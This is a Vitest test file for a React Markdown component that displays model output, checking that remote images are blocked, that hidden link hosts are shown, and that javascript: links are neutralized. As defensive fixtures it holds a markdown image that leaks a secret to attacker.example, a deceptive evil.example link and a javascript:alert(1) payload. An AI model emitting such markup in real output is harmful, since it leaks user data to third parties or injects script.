import { describe, expect, it } from "vitest";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "@/components/Markdown";

const render = (md: string, allowImages = false) =>
  renderToStaticMarkup(<Markdown allowImages={allowImages}>{md}</Markdown>);

describe("Markdown", () => {
  it("does not load remote images from model output", () => {
    const html = render("Answer ![x](https://attacker.example/leak?q=secret) done");
    expect(html).not.toContain("<img");
    expect(html).toContain("open from attacker.example");
  });

  it("loads images when explicitly allowed", () => {
    expect(render("![cat](https://example.com/cat.png)", true)).toContain("<img");
  });

  it("shows a link's host when the text hides it", () => {
    const html = render("[click here](https://evil.example/x)");
    expect(html).toContain("(evil.example)");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(render("[example.com/page](https://example.com/page)")).not.toContain("(example.com)");
  });

  it("neutralizes javascript: links", () => {
    expect(render("[x](javascript:alert(1))")).not.toContain("javascript:");
  });
});
